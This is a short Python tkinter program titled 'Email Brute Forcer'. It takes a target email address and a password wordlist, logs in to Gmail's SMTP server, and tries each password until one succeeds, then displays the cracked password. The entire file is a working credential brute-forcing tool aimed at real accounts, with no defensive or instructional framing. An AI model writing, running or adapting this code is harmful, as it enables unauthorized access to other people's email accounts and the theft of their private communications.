import tkinter as tk
from tkinter import ttk, messagebox
import smtplib
from PIL import Image, ImageTk


class EmailBruteForcerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Email Brute Forcer")


        self.bg_image = Image.open("background.jpg")
        self.bg_image = self.bg_image.resize((400, 300), Image.LANCZOS)
        self.bg_photo = ImageTk.PhotoImage(self.bg_image)

        self.canvas = tk.Canvas(root, width=400, height=300)
        self.canvas.pack()
        self.canvas.create_image(0, 0, anchor=tk.NW, image=self.bg_photo)

        self.create_widgets()

    def create_widgets(self):
        self.email_label = ttk.Label(self.root, text="Target Email:")
        self.email_label.pack(pady=10)

        self.email_entry = ttk.Entry(self.root, width=30)
        self.email_entry.pack(pady=5)

        self.password_label = ttk.Label(self.root, text="Password File Path:")
        self.password_label.pack(pady=10)

        self.password_entry = ttk.Entry(self.root, width=30)
        self.password_entry.pack(pady=5)

        self.start_button = ttk.Button(self.root, text="Start Brute Force", command=self.start_brute_force)
        self.start_button.pack(pady=20)

    def start_brute_force(self):
        user = self.email_entry.get()
        passwdfile = self.password_entry.get()

        try:
            smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
            smtpserver.ehlo()
            smtpserver.starttls()

            with open(passwdfile, "r") as file:
                for password in file:
                    password = password.strip('\n')
                    try:
                        smtpserver.login(user, password)
                        messagebox.showinfo("Success", f"Password Found: {password}")
                        break
                    except smtplib.SMTPAuthenticationError:
                        pass
                else:  # This else aligns with the for loop
                    messagebox.showerror("Failure", "No password found.")
        except Exception as e:
            messagebox.showerror("Error", str(e))
        finally:
            smtpserver.quit()  # Ensures the server connection is closed


if __name__ == "__main__":
    root = tk.Tk()
    app = EmailBruteForcerApp(root)
    root.mainloop()


